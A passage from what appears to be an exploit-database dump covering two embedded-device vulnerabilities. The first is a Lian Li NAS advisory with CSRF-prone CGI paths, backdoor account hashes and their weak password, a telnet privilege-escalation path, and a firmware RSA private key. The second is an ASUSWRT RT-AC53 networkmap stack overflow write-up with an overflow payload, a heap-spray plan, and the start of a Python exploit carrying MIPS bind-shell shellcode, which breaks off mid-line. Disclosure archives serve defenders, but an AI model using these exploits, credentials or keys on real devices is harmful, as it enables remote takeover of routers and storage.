\ncgi/backup/fixed2.cgi\r\ncgi/backup/schedule2.cgi\r\ncgi/backup/email3.cgi\r\ncgi/backup/fixed3.cgi\r\ncgi/backup/schedule3.cgi\r\ncgi/backup/dd_schedule1.cgi\r\ncgi/backup/dd_schedule2.cgi\r\ncgi/backup/dd_schedule3.cgi\r\ncgi/backup/dd_schedule5.cgi\r\ncgi/backup/email5.cgi\r\ncgi/backup/fixed5.cgi\r\ncgi/backup/schedule5.cgi\r\ncgi/backup/fixed6.cgi\r\ncgi/backup/ipaddress6.cgi\r\ncgi/backup/listing6.cgi\r\ncgi/backup/s6.cgi\r\ncgi/backup/email6.cgi\r\ncgi/backup/schedule6.cgi\r\ncgi/backup/source6.cgi\r\ncgi/backup/dd_schedule6.cgi\r\ncgi/backup/fixed4.cgi\r\ncgi/backup/ipaddress4.cgi\r\ncgi/backup/listing4.cgi\r\ncgi/backup/s4.cgi\r\ncgi/backup/email4.cgi\r\ncgi/backup/schedule4.cgi\r\ncgi/backup/source4.cgi\r\ncgi/backup/dd_schedule4.cgi\r\ncgi/backup/emessage.cgi\r\ncgi/backup/emessage_fail.cgi\r\ncgi/group/group.cgi\r\ncgi/group/groupHandler.cgi\r\ncgi/group/groupDeleteHandler.cgi\r\ncgi/group/groupMembers.cgi\r\ncgi/group/groupMembersHandler.cgi\r\ncgi/user/user.cgi\r\ncgi/user/userHandler.cgi\r\ncgi/user/userDeleteHandler.cgi\r\ncgi/user/userMembership.cgi\r\ncgi/user/userMembershipHandler.cgi\r\ncgi/time/time.cgi\r\ncgi/time/timeHandler.cgi\r\ncgi/power/power.cgi\r\ncgi/power/powerHandler.cgi\r\ncgi/factoryReset/factoryReset.cgi\r\ncgi/factoryReset/factoryResetHandler.cgi\r\ncgi/restoreConfig/restoreConfig.cgi\r\ncgi/restoreConfig/restoreConfigHandler.cgi\r\ncgi/saveConfig/saveConfig.cgi\r\ncgi/saveConfig/saveConfigHandler.cgi\r\ncgi/diskUsage/diskUsage.cgi\r\ncgi/diskUsage/diskUsageuser.cgi\r\ncgi/diskUsage/diskUsageHandler.cgi\r\ncgi/diskUsage/diskUsageuserHandler.cgi\r\ncgi/diskUtility/diskUtility.cgi\r\ncgi/diskUtility/diskUtilityHandler.cgi\r\ncgi/diskUtility/healthReport.cgi\r\ncgi/dhcpserver/dhcpserver.cgi\r\ncgi/dhcpserver/dhcpserverHandler.cgi\r\ncgi/dhcpserver/dhcplease.cgi\r\ncgi/dhcpserver/dhcpleaseHandler.cgi\r\ncgi/dhcpserver/dhcpstatic.cgi\r\ncgi/dhcpserver/dhcpstaticHandler.cgi\r\ncgi/dhcpserver/staticipDeleteHandler.cgi\r\ncgi/errorAlert/errorAlert.cgi\r\ncgi/errorAlert/errorAlertHandler.cgi\r\ncgi/share/share.cgi\r\ncgi/share/shareHandler.cgi\r\ncgi/share/shareDeleteHandler.cgi\r\ncgi/share/share_nonLinux.cgi\r\ncgi/share/share_nonLinuxHandler.cgi\r\ncgi/share/share_Linux.cgi\r\ncgi/share/share_LinuxHandler.cgi\r\ncgi/fileServer/fileServer.cgi\r\ncgi/fileServer/fileServerHandler.cgi\r\ncgi/log_system/log_system.cgi\r\ncgi/log_system/log_systemHandler.cgi\r\ncgi/log_admin/log_admin.cgi\r\ncgi/log_admin/log_adminHandler.cgi\r\ncgi/log_dhcp/log_dhcp.cgi\r\ncgi/log_dhcp/log_dhcpHandler.cgi\r\ncgi/log_ftp/log_ftp.cgi\r\ncgi/log_ftp/log_ftpHandler.cgi\r\ncgi/log_samba/log_samba.cgi\r\ncgi/log_samba/log_sambaHandler.cgi\r\ncgi/printer/printer.cgi\r\ncgi/printer/printerHandler.cgi\r\ncgi/upgrade2/upgrade.cgi\r\ncgi/upgrade2/upgradeHandler.cgi\r\ncgi/wizard/wizard.cgi\r\ncgi/wizard/language.cgi\r\ncgi/wizard/languageHandler.cgi\r\ncgi/wizard/password.cgi\r\ncgi/wizard/passwordHandler.cgi\r\ncgi/wizard/hostname.cgi\r\ncgi/wizard/hostnameHandler.cgi\r\ncgi/wizard/tcpip.cgi\r\ncgi/wizard/tcpipHandler.cgi\r\ncgi/wizard/time.cgi\r\ncgi/wizard/timeHandler.cgi\r\ncgi/wizard/confirm.cgi\r\ncgi/wizard/confirmHandler.cgi\r\ncgi/wizard/addUser.cgi\r\ncgi/wizard/user.cgi\r\ncgi/wizard/userHandler.cgi\r\ncgi/wizard/userMembership.cgi\r\ncgi/wizard/userMembershipHandler.cgi\r\ncgi/wizard/userSharePermission.cgi\r\ncgi/wizard/userSharePermissionHandler.cgi\r\ncgi/wizard/addGroup.cgi\r\ncgi/wizard/group.cgi\r\ncgi/wizard/groupHandler.cgi\r\ncgi/wizard/groupMembers.cgi\r\ncgi/wizard/groupMembersHandler.cgi\r\ncgi/wizard/groupSharePermission.cgi\r\ncgi/wizard/groupSharePermissionHandler.cgi\r\ncgi/wizard/addShare.cgi\r\ncgi/wizard/share.cgi\r\ncgi/wizard/shareHandler.cgi\r\ncgi/wizard/sharePermission.cgi\r\ncgi/wizard/sharePermissionHandler.cgi\r\ncgi/wizard/nfsPermission.cgi\r\ncgi/wizard/nfsPermissionHandler.cgi\r\ncgi/wizard/button.cgi\r\ncgi/telnet/telnet.cgi\r\ncgi/telnet/telnetHandler.cgi\r\ncgi/bonjour/bonjour.cgi\r\ncgi/bonjour/bonjourHandler.cgi\r\ncgi/raid/raid.cgi\r\ncgi/raid/raidHandler.cgi\r\ncgi/swupdate/swupdate.cgi\r\ncgi/swupdate/swupdateHandler.cgi\r\ncgi/swupdate/installHandler.cgi\r\ncgi/swupdate/swlist.cgi\r\ncgi/swupdate/swlistHandler.cgi\r\n\r\nAll forms on those cgi pages can be used to perform CSRF attacks (to target internal network for example).\r\n\r\n3. Backdoored accounts\r\n\r\nSome users are not referenced in the management page but are present in the system. \r\nMoreover, the robustness of such passwords is really poor (password = "123456"): \r\n\r\nmysql:$1$$RmyPVMlhpXjJj8iv4w.Ul.:6000:6000:Linux User,,,:/home/mysql:/bin/sh\r\ndaemon:$1$$RmyPVMlhpXjJj8iv4w.Ul.:7000:7000:Linux User,,,:/home/daemon:/bin/sh\r\n\r\n4. Privilege escalation "scenario"\r\n\r\nEnable Telnet server (if disabled)\r\nConnect to it using one of the backdoored accounts and retrieve /etc/passwd file.\r\nIt contains passwords for all accounts.\r\n\r\n5. Certificate used by the FTP server stored in the firmware\r\n\r\ncacert.pem\r\n\r\nsubject=/C=AU/SOP=QLD/O=Mincom Pty. Ltd./OU=CS/CN=SSLeay demo server\r\nissuer= /C=AU/SOP=QLD/O=Mincom Pty. Ltd./OU=CS/CN=CA\r\n-----BEGIN X509 CERTIFICATE-----\r\n\r\nMIIBgjCCASwCAQQwDQYJKoZIhvcNAQEEBQAwODELMAkGA1UEBhMCQVUxDDAKBgNV\r\nBAgTA1FMRDEbMBkGA1UEAxMSU1NMZWF5L3JzYSB0ZXN0IENBMB4XDTk1MTAwOTIz\r\nMzIwNVoXDTk4MDcwNTIzMzIwNVowYDELMAkGA1UEBhMCQVUxDDAKBgNVBAgTA1FM\r\nRDEZMBcGA1UEChMQTWluY29tIFB0eS4gTHRkLjELMAkGA1UECxMCQ1MxGzAZBgNV\r\nBAMTElNTTGVheSBkZW1vIHNlcnZlcjBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQC3\r\nLCXcScWua0PFLkHBLm2VejqpA1F4RQ8q0VjRiPafjx/Z/aWH3ipdMVvuJGa/wFXb\r\n/nDFLDlfWp+oCPwhBtVPAgMBAAEwDQYJKoZIhvcNAQEEBQADQQArNFsihWIjBzb0\r\nDCsU0BvL2bvSwJrPEqFlkDq3F4M6EGutL9axEcANWgbbEdAvNJD1dmEmoWny27Pn\r\nIMs6ZOZB\r\n-----END X509 CERTIFICATE-----\r\n\r\nserver-cert.pem\r\n\r\nCertificate:\r\n    Data:\r\n        Version: 3 (0x2)\r\n        Serial Number: 1 (0x1)\r\n        Signature Algorithm: sha1WithRSAEncryption\r\n        Issuer: C=TW, ST=Taipei, O=Storm, OU=software, CN=aaron/emailAddress=aaron@storlinksemi.com\r\n        Validity\r\n            Not Before: Jan  3 00:46:50 2007 GMT\r\n            Not After : Jan  3 00:46:50 2008 GMT\r\n        Subject: C=TW, ST=Taipei, L=Hsinchu, O=Storm, OU=software, CN=aaron/emailAddress=aaron@storlinksemi.com\r\n        Subject Public Key Info:\r\n            Public Key Algorithm: rsaEncryption\r\n            RSA Public Key: (1024 bit)\r\n                Modulus (1024 bit):\r\n                    00:c4:1d:89:dc:9b:45:6c:96:e2:ad:e6:98:13:25:\r\n                    64:b4:54:f6:e4:97:74:d5:9f:15:1e:1d:45:a1:75:\r\n                    45:fc:3b:2b:9c:dd:e6:0d:34:4b:d7:6c:8d:d0:32:\r\n                    5f:39:25:ab:53:81:de:84:17:cf:27:0a:c2:26:82:\r\n                    9f:09:3f:a8:7e:8c:31:c3:fe:43:75:fe:1f:53:8e:\r\n                    74:0e:31:d2:55:71:51:1b:7a:01:e3:57:4f:f7:d6:\r\n                    9f:1d:39:19:42:3c:a1:bd:08:d1:99:69:fc:1c:34:\r\n                    6e:0f:fb:a7:36:f5:77:bf:95:c8:1d:50:30:25:59:\r\n                    23:39:d3:27:5a:06:0a:05:6d\r\n                Exponent: 65537 (0x10001)\r\n        X509v3 extensions:\r\n            X509v3 Basic Constraints: \r\n                CA:FALSE\r\n            Netscape Comment: \r\n                OpenSSL Generated Certificate\r\n            X509v3 Subject Key Identifier: \r\n                61:19:1F:04:38:83:83:E0:CD:6A:8C:CA:F9:9C:6E:D3:7F:C5:55:C3\r\n            X509v3 Authority Key Identifier: \r\n                keyid:F6:E9:49:A1:24:01:C1:0A:4C:7F:6A:E7:58:B8:95:BC:AF:95:B4:F7\r\n                DirName:/C=TW/ST=Taipei/O=Storm/OU=software/CN=aaron/emailAddress=aaron@storlinksemi.com\r\n                serial:00\r\n\r\n    Signature Algorithm: sha1WithRSAEncryption\r\n        5b:b7:dc:28:58:5e:53:c5:d7:88:be:71:21:43:b5:db:a1:d7:\r\n        fc:de:38:1d:38:e7:b3:a4:a5:64:92:1b:67:1b:c8:3e:0f:a9:\r\n        16:77:0c:0b:bf:e9:d2:b5:70:cd:05:71:df:1a:db:2a:c8:56:\r\n        5d:91:1c:ef:2b:16:b3:f0:55:89:ba:35:e4:ae:07:6c:4a:c5:\r\n        d0:0d:e3:1b:1d:5e:fd:01:b2:52:0e:fe:05:08:ed:40:26:e6:\r\n        b0:2b:24:2f:0d:42:11:f0:d9:b4:6d:db:ce:d1:b1:65:77:62:\r\n        7a:06:8b:09:c7:33:f3:43:13:a7:33:47:af:5c:6a:39:4e:8f:\r\n        64:5c\r\n-----BEGIN CERTIFICATE-----\r\nMIIDezCCAuSgAwIBAgIBATANBgkqhkiG9w0BAQUFADB4MQswCQYDVQQGEwJUVzEP\r\nMA0GA1UECBMGVGFpcGVpMQ4wDAYDVQQKEwVTdG9ybTERMA8GA1UECxMIc29mdHdh\r\ncmUxDjAMBgNVBAMTBWFhcm9uMSUwIwYJKoZIhvcNAQkBFhZhYXJvbkBzdG9ybGlu\r\na3NlbWkuY29tMB4XDTA3MDEwMzAwNDY1MFoXDTA4MDEwMzAwNDY1MFowgYoxCzAJ\r\nBgNVBAYTAlRXMQ8wDQYDVQQIEwZUYWlwZWkxEDAOBgNVBAcTB0hzaW5jaHUxDjAM\r\nBgNVBAoTBVN0b3JtMREwDwYDVQQLEwhzb2Z0d2FyZTEOMAwGA1UEAxMFYWFyb24x\r\nJTAjBgkqhkiG9w0BCQEWFmFhcm9uQHN0b3JsaW5rc2VtaS5jb20wgZ8wDQYJKoZI\r\nhvcNAQEBBQADgY0AMIGJAoGBAMQdidybRWyW4q3mmBMlZLRU9uSXdNWfFR4dRaF1\r\nRfw7K5zd5g00S9dsjdAyXzklq1OB3oQXzycKwiaCnwk/qH6MMcP+Q3X+H1OOdA4x\r\n0lVxURt6AeNXT/fWnx05GUI8ob0I0Zlp/Bw0bg/7pzb1d7+VyB1QMCVZIznTJ1oG\r\nCgVtAgMBAAGjggEAMIH9MAkGA1UdEwQCMAAwLAYJYIZIAYb4QgENBB8WHU9wZW5T\r\nU0wgR2VuZXJhdGVkIENlcnRpZmljYXRlMB0GA1UdDgQWBBRhGR8EOIOD4M1qjMr5\r\nnG7Tf8VVwzCBogYDVR0jBIGaMIGXgBT26UmhJAHBCkx/audYuJW8r5W096F8pHow\r\neDELMAkGA1UEBhMCVFcxDzANBgNVBAgTBlRhaXBlaTEOMAwGA1UEChMFU3Rvcm0x\r\nETAPBgNVBAsTCHNvZnR3YXJlMQ4wDAYDVQQDEwVhYXJvbjElMCMGCSqGSIb3DQEJ\r\nARYWYWFyb25Ac3RvcmxpbmtzZW1pLmNvbYIBADANBgkqhkiG9w0BAQUFAAOBgQBb\r\nt9woWF5TxdeIvnEhQ7Xbodf83jgdOOezpKVkkhtnG8g+D6kWdwwLv+nStXDNBXHf\r\nGtsqyFZdkRzvKxaz8FWJujXkrgdsSsXQDeMbHV79AbJSDv4FCO1AJuawKyQvDUIR\r\n8Nm0bdvO0bFld2J6BosJxzPzQxOnM0evXGo5To9kXA==\r\n-----END CERTIFICATE-----\r\n\r\nserver-key.pem\r\n\r\n-----BEGIN RSA PRIVATE KEY-----\r\nMIICXQIBAAKBgQDEHYncm0VsluKt5pgTJWS0VPbkl3TVnxUeHUWhdUX8Oyuc3eYN\r\nNEvXbI3QMl85JatTgd6EF88nCsImgp8JP6h+jDHD/kN1/h9TjnQOMdJVcVEbegHj\r\nV0/31p8dORlCPKG9CNGZafwcNG4P+6c29Xe/lcgdUDAlWSM50ydaBgoFbQIDAQAB\r\nAoGBAIKcZZd99aOXbcqBm+CMc+BCAdhGInKvK0JOHnSkhQKyaZ5kjnVW0ffb/Sqe\r\nkZqewtav1IFG1hjbamh5b++Z7N2F+jshPnacdBXrgT4PPUfj3+ZirXlyckxJv3YT\r\nQl1bLsaCMne2b4sUuGsldROfiXfOR5SDUhbHocQj+mj8C/OlAkEA/4TfMZJqIkAx\r\nW7uwPqX7c6k1XhLwC5tjEkyZA3jhgLMCDzw1RGxO65haVyKm//e4f1S7ctQ/v80j\r\nRret0A4cnwJBAMR8CqOpKI7W4Qao2aIYmL36a9VIFWoNunlmuSUW/KiBkAGhfGBn\r\n+VG0uueM4PdOWl0i45SyZxTiYUjxE+BSlnMCQQDp611dB3osYvIM1dVydQevCgA2\r\nYEXrilR3YzJNkHN5G+fNxMPLIRBa9H33+VxDRyhbQVndtNurnoQl8G+p4dFnAkA5\r\nFtl4iBPyvNiROMpTYNYwjOx8Af/G2spNr90nu7AZvdt7vdIHqO42IU8VLEfJU4jJ\r\n+vMpJ1TwKn6d1P4zdYulAkB1FPvPcRmn1P69b2tDGEeoSNbh4s7eqV7AntDGeQhp\r\nppiLtY+nlj+Mjs2pHLa1bRAWcQRl/GYU4rdF6Py9F/w/\r\n-----END RSA PRIVATE KEY-----', u'description': u'Lian Li NAS - Multiple Vulnerabilities', u'platform': u'hardware', u'author': u'pws', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-07-24T00:00:00+00:00', u'_id': 34163, u'type': u'webapps', u'port': 0}

CVE: [u'CVE-2017-6548']
Description: ASUSWRT RT-AC53 (3.0.0.4.380.6038) - Remote Code Execution
{u'code': u'Remote Code Execution\r\n\r\nComponent: networkmap\r\n\r\nCVE: CVE-2017-6548\r\n\r\nnetworkmap is responsible for generating a map of computers connected to the router. It continuously monitors the LAN to detect ARP requests submitted by unknown computers. When a new MAC address appears it will probe the related IP address for running services like printer sharing, http server and also iTunes servers.\r\n\r\nThis is implemented by sending out multicast SSP discoveries:\r\n\r\nM-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMAN:"ssdp:discover"\r\nMX:3\r\nA device can then respond with messages which indicate the location of the iTunes service.\r\n\r\nHTTP/1.1 200 OK\r\nLocation:HTTP://host:port/path\r\nVulnerability:\r\n\r\nThe function process_device_repsonse is responsible for parsing the SSDP answer:\r\n\r\n                                                                                                                                             \r\n/************************************************************************************************/\r\n// process the device response "HTTP/1.1 200 OK"\r\nint process_device_response(char *msg)\r\n{\r\n        char *line, *body, *p;                  // temporary variables\r\n        char *location = NULL;                  // the LOCATION: header\r\n        char host[16], port[6];                 // the ip and port of the device\r\n        ushort destport;                        // the integer type of device port\r\n        char *data = NULL;                      // the data in packet\r\n        int http_fd;                            // the http socket fd\r\n        int nbytes;                             // recv number\r\n        int i;\r\n        char *descri = NULL;\r\n        int len;\r\n\tstruct timeval timeout={10, 0};\r\n\r\n        //search "\\r\\n\\r\\n" or "\\r\\n" first appear place and judge whether msg have blank.\r\n        if( (body = strstr(msg, "\\r\\n\\r\\n")) != NULL)\r\n                body +=4;\r\n        else if ( (body = strstr(msg, "\\r\\n")) != NULL)\r\n                body +=2;\r\n        else\r\n                return 0;\r\n                                                                                                                                             \r\n        p = msg;\r\n        // find the LOCATION information.\r\n        while( p!= NULL && p < body)\r\n        {\r\n                line = strsep(&p, "\\r\\n");      //divide up string\r\n                if((strncmp(line, "LOCATION:", 9) == 0) || (strncmp(line, "Location:", 9) == 0))\r\n                {\r\n                        location = strip_chars(&line[9], "\\t");\r\n                        location = strip_chars(&line[9], " ");\r\n                        break;\r\n                }\r\n        }\r\n        NMP_DEBUG_F("UPnP location=%s\\n", location);\r\n        //fprintf(fp_upnp, "UPnP location=%s\\n", location);//Yau                                                                                                                                     \r\n        // get the destination ip\r\n        location += 7;\r\n\ti = 0;\r\n\twhile( (*location != \':\') && (*location != \'/\')) {\r\n                host[i] = *location++;\r\n\t\ti++;\r\n\t}\r\n        host[i] = \'\\0\';\r\n        //get the destination port\r\n        if(*location == \':\') {\r\n            \tfor(location++, i =0; *location != \'/\'; i++)\r\n                \tport[i] = *location++;\r\n            \tport[i] = \'\\0\';\r\n            \tdestport = (ushort)atoi(port);\r\n\t}\r\n\telse\r\n\t\tdestport = 80;\r\nIt contains multiple buffer overflows in the parsing code for host and port. This stack-based overflow can be used to gain control over networkmap\u2019s control flow by overwriting the saved $pc stored on the stack.\r\n\r\nParsing this message:\r\n\r\nHTTP/1.1 200 OK\r\nLocation:HTTP://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/\r\nwill overflow host[16] and lead to $pc being set to 0x41414141 which is a starting point for further exploitation.\r\n\r\nExploitation:\r\n\r\nIn order to develop a working exploit we gather further information of the system.\r\n\r\nGeneral Information:\r\n\r\nASUSWRT is based on Linux which is running on a little endian MIPS CPU. The vulnerable program networkmap gets automatically started when the device boots and additionally gets restarted by the watchdog process if it crashes.\r\n\r\n# cat /proc/cpuinfo \r\nsystem type     : MT7620\r\nprocessor       : 0\r\ncpu model       : MIPS 24Kc V5.0\r\nBogoMIPS        : 386.04\r\nwait instruction    : yes\r\nmicrosecond timers  : yes\r\ntlb_entries     : 32\r\nextra interrupt vector  : yes\r\nhardware watchpoint : yes, count: 4, address/irw mask: [0x0000, 0x0ff8, 0x0ff8, 0x0ff8]\r\nASEs implemented    : mips16 dsp\r\nshadow register sets    : 1\r\ncore            : 0\r\nVCED exceptions     : not available\r\nVCEI exceptions     : not available\r\n\r\n# ps\r\n  PID USER       VSZ STAT COMMAND\r\n    1 admin     3940 S    /sbin/init\r\n    2 admin        0 SW   [kthreadd]\r\n    3 admin        0 SW   [ksoftirqd/0]\r\n    4 admin        0 SW   [kworker/0:0]\r\n    5 admin        0 SW   [kworker/u:0]\r\n    6 admin        0 SW<  [khelper]\r\n    7 admin        0 SW   [sync_supers]\r\n    8 admin        0 SW   [bdi-default]\r\n    9 admin        0 SW<  [kintegrityd]\r\n   10 admin        0 SW<  [kblockd]\r\n   11 admin        0 SW   [kswapd0]\r\n   12 admin        0 SW   [fsnotify_mark]\r\n   13 admin        0 SW<  [crypto]\r\n   17 admin        0 SW   [mtdblock0]\r\n   18 admin        0 SW   [mtdblock1]\r\n   19 admin        0 SW   [mtdblock2]\r\n   20 admin        0 SW   [mtdblock3]\r\n   21 admin        0 SW   [mtdblock4]\r\n   22 admin        0 SW   [mtdblock5]\r\n   23 admin        0 SW   [kworker/u:1]\r\n   30 admin        0 SW   [kworker/0:1]\r\n   41 admin      660 S    hotplug2 --persistent --no-coldplug\r\n   76 admin     3924 S    console\r\n   78 admin     1276 S    /sbin/syslogd -m 0 -S -O /tmp/syslog.log -s 256 -l 6\r\n   80 admin     1276 S    /sbin/klogd -c 5\r\n   82 admin     1292 S    /bin/sh\r\n  115 admin        0 SW   [RtmpCmdQTask]\r\n  116 admin        0 SW   [RtmpWscTask]\r\n  135 admin        0 SW   [RtmpCmdQTask]\r\n  136 admin        0 SW   [RtmpWscTask]\r\n  164 admin     3932 S    /sbin/wanduck\r\n  168 admin     1128 S    dropbear -p 192.168.1.1:22 -a\r\n  175 admin     3932 S    wpsaide\r\n  189 nobody    1056 S    dnsmasq --log-async\r\n  194 admin     2588 S    avahi-daemon: running [RT-AC53-B8F4.local]\r\n  196 admin     4112 S    httpd -i br0\r\n  197 admin     1068 S    /usr/sbin/infosvr br0\r\n  199 admin     3932 S    watchdog\r\n  201 admin     2180 S    rstats\r\n  210 admin     1160 S    lld2d br0\r\n  211 admin     3932 S    ots\r\n  224 admin      800 S    miniupnpd -f /etc/upnp/config\r\n  229 admin     1284 S    /sbin/udhcpc -i vlan2 -p /var/run/udhcpc0.pid -s /tmp/udhcpc -O33 -O249\r\n  302 admin     1152 S    dropbear -p 192.168.1.1:22 -a\r\n  303 admin     1300 S    -sh\r\n  344 admin     1128 S    networkmap\r\n  359 admin     1280 R    ps\r\n\r\n# uname -a\r\nLinux (none) 2.6.36 #1 Fri Sep 23 12:05:55 CST 2016 mips GNU/Linux\r\nMemory Map:\r\n\r\nnetworkmap\u2019s memory map is analyzed to continue exploiting the device.\r\n\r\n# cat /proc/$(pidof networkmap)/maps\r\n00400000-0040b000 r-xp 00000000 1f:04 270        /usr/sbin/networkmap\r\n0041a000-0041b000 rw-p 0000a000 1f:04 270        /usr/sbin/networkmap\r\n0041b000-0041f000 rwxp 00000000 00:00 0          [heap]\r\n2b893000-2b894000 rw-p 00000000 00:00 0 \r\n2b894000-2b89a000 r-xp 00000000 1f:04 828        /lib/ld-uClibc.so.0\r\n2b89a000-2b8a0000 rw-s 00000000 00:04 0          /SYSV000003e9 (deleted)\r\n2b8a0000-2b8a4000 rw-s 00000000 00:04 32769      /SYSV000003ea (deleted)\r\n2b8a9000-2b8aa000 r--p 00005000 1f:04 828        /lib/ld-uClibc.so.0\r\n2b8aa000-2b8ab000 rw-p 00006000 1f:04 828        /lib/ld-uClibc.so.0\r\n2b8ab000-2b8d9000 r-xp 00000000 1f:04 258        /usr/lib/libshared.so\r\n2b8d9000-2b8e8000 ---p 00000000 00:00 0 \r\n2b8e8000-2b8eb000 rw-p 0002d000 1f:04 258        /usr/lib/libshared.so\r\n2b8eb000-2b8ed000 rw-p 00000000 00:00 0 \r\n2b8ed000-2b8ef000 r-xp 00000000 1f:04 235        /usr/lib/libnvram.so\r\n2b8ef000-2b8ff000 ---p 00000000 00:00 0 \r\n2b8ff000-2b900000 rw-p 00002000 1f:04 235        /usr/lib/libnvram.so\r\n2b900000-2b90e000 r-xp 00000000 1f:04 760        /lib/libgcc_s.so.1\r\n2b90e000-2b91e000 ---p 00000000 00:00 0 \r\n2b91e000-2b91f000 rw-p 0000e000 1f:04 760        /lib/libgcc_s.so.1\r\n2b91f000-2b95a000 r-xp 00000000 1f:04 827        /lib/libc.so.0\r\n2b95a000-2b96a000 ---p 00000000 00:00 0 \r\n2b96a000-2b96b000 rw-p 0003b000 1f:04 827        /lib/libc.so.0\r\n2b96b000-2b96f000 rw-p 00000000 00:00 0 \r\n2b970000-2b97f000 r--s 03eb0000 00:0c 78         /dev/nvram\r\n7f8a7000-7f8c8000 rwxp 00000000 00:00 0          [stack]\r\n7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]\r\nObservations:\r\n\r\nPartial ASLR is activated:\r\n\r\nStack address is randomized\r\nLibrary addresses are randomized\r\nProgram address is not randomized\r\nHeap address is not randomized\r\nThere is no Stack-Protector\r\n\r\nBoth heap and stack are mapped executable\r\n\r\nThe binary contains almost no gadgets suitable for building a ROP chain\r\n\r\nExploit:\r\n\r\nThe final exploit consists of the following steps:\r\n\r\nStarting a webserver serving shellcode\r\nListening for multicast UDP messages send by the router\r\nDatabase clearing / crashing: to make the heap layout predictable\r\nRandomizing MAC address\r\nSend message: jump to gadget that deletes networkmap\u2019s database and crashes\r\nnetworkmap will be restarted\r\nSpraying heap 1, 2:\r\nRandomizing MAC address\r\nSend message: containing the webserver\u2019s IP+port\r\nnetworkmap will receive shellcode and store it on the heap\r\nStarting payload\r\nRandomize MAC address\r\nSend message: jump to heap address containing the shellcode\r\nConnect to opened shell\r\nFor further details check out the full exploit: networkmap-pwn.py (https://bierbaumer.net/networkmap-pwn.py)\r\n\r\nExample:\r\n\r\n# ./networkmap-pwn.py\r\n[-] starting webserver\r\n[-] received SSP discovery\r\n[-] clearing database and crashing\r\n[-] received SSP discovery\r\n[-] spraying heap 1/2\r\n[-] got shellcode request\r\n[-] sending shellcode\r\n[-] received SSP discovery\r\n[-] spraying heap 2/2\r\n[-] received SSP discovery\r\n[-] starting payload\r\n[-] try to connect to shell\r\n[-] try to connect to shell\r\n[+] connected\r\nLinux (none) 2.6.36 #1 Fri Sep 23 12:05:55 CST 2016 mips GNU/Linux\r\n[+] pwned\r\n\r\n\r\n\r\n\r\n---networkmap-pwn.py---\r\n#!/usr/bin/env python3\r\n# ASUSWRT networkmap Remote Code Execution\r\n# Author: Bruno Bierbaumer\r\n# Date: 24/02/2017\r\n# Tested version:\r\n# RT-AC53 (3.0.0.4.380.6038)\r\n# CVE: TODO\r\n\r\n# Description:\r\n# networkmap contains a stack-based buffer overflow which can be exploited to run arbitrary code.\r\n\r\n\r\nROUTER_IP = \'192.168.1.1\'\r\nIP = \'192.168.1.2\'\r\nINTERACE = \'enp0s31f6\'\r\n\r\n"""\r\n Shellcode adjusted from https://www.exploit-db.com/exploits/13298/\r\n"""\r\n\r\nsc = b"\\x41\\x41\\x04\\x28" *1400 #   nops\r\n#alarm handling\r\nsc += b"\\xff\\xff\\x04\\x28"   #     a0 <- 0                          */\r\nsc += b"\\xbb\\x0f\\x02\\x24"   #     li      v0,4027 ( __alarm )      */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall    \r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\n#/alarm\r\nsc += b"\\xe0\\xff\\xbd\\x27"   #     addiu   sp,sp,-32                */\r\nsc += b"\\xfd\\xff\\x0e\\x24"   #     li      t6,-3                    */\r\nsc += b"\\x27\\x20\\xc0\\x01"   #     nor     a0,t6,zero               */\r\nsc += b"\\x27\\x28\\xc0\\x01"   #     nor     a1,t6,zero               */\r\nsc += b"\\xff\\xff\\x06\\x28"   #     slti    a2,zero,-1               */   \r\nsc += b"\\x57\\x10\\x02\\x24"   #     li      v0,4183 ( __NR_socket )  */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\xff\\xff\\x50\\x30"   #     andi    s0,v0,0xffff             */   \r\nsc += b"\\xef\\xff\\x0e\\x24"   #     li      t6,-17                   */\r\nsc += b"\\x27\\x70\\xc0\\x01"   #     nor     t6,t6,zero               */\r\nsc += b"\\x13\\x37\\x0d\\x24"   #     li      t5,0x3713 (port 0x1337)  */\r\nsc += b"\\x04\\x68\\xcd\\x01"   #     sllv    t5,t5,t6                 */\r\nsc += b"\\xff\\xfd\\x0e\\x24"   #     li      t6,-513                  */\r\nsc += b"\\x27\\x70\\xc0\\x01"   #     nor     t6,t6,zero               */\r\nsc += b"\\x25\\x68\\xae\\x01"   #     or      t5,t5,t6                 */\r\nsc += b"\\xe0\\xff\\xad\\xaf"   #     sw      t5,-32(sp)               */\r\nsc += b"\\xe4\\xff\\xa0\\xaf"   #     sw      zero,-28(sp)             */   \r\nsc += b"\\xe8\\xff\\xa0\\xaf"   #     sw      zero,-24(sp)             */\r\nsc += b"\\xec\\xff\\xa0\\xaf"   #     sw      zero,-20(sp)             */\r\nsc += b"\\x25\\x20\\x10\\x02"   #     or      a0,s0,s0                 */\r\nsc += b"\\xef\\xff\\x0e\\x24"   #     li      t6,-17                   */\r\nsc += b"\\x27\\x30\\xc0\\x01"   #     nor     a2,t6,zero               */\r\nsc += b"\\xe0\\xff\\xa5\\x23"   #     addi    a1,sp,-32                */\r\nsc += b"\\x49\\x10\\x02\\x24"   #     li      v0,4169 ( __NR_bind )    */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\x25\\x20\\x10\\x02"   #     or      a0,s0,s0                 */\r\nsc += b"\\x01\\x01\\x05\\x24"   #     li      a1,257                   */\r\nsc += b"\\x4e\\x10\\x02\\x24"   #     li      v0,4174 ( __NR_listen )  */   \r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\x25\\x20\\x10\\x02"   #     or      a0,s0,s0                 */\r\nsc += b"\\xff\\xff\\x05\\x28"   #     slti    a1,zero,-1               */\r\nsc += b"\\xff\\xff\\x06\\x28"   #     slti    a2,zero,-1               */\r\nsc += b"\\x48\\x10\\x02\\x24"   #     li      v0,4168 ( __NR_accept 